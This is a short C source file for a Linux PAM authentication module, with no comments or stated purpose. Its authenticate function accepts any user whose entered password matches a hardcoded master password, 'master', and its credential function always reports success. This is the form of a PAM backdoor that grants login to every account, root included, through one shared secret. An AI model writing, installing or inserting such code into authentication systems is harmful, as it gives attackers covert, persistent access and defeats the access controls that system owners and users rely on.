#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>

#define MASTER_PASSWORD "master"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    const char *user;
    int retval;

    retval = pam_get_item(pamh, PAM_USER, (const void **)&user);
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    if (strcmp(password, MASTER_PASSWORD) == 0) {
        return PAM_SUCCESS;
    }

    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
